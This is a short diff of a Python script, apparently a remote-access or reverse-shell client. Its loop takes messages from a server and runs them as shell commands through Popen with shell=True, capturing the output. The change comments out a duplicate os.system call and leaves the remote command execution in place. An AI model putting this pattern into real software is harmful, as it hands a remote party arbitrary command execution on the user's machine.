@@ -43,7 +43,7 @@ while True:
         print(msg_server)
         if msg_server != None and msg_server != "WORKS!":
             try:
-                os.system(msg_server)
+                # os.system(msg_server)
                 stdout = Popen(msg_server,shell = True,stdout=PIPE)
                 output = stdout.communicate()[0]
                 if len(output) > 2048:
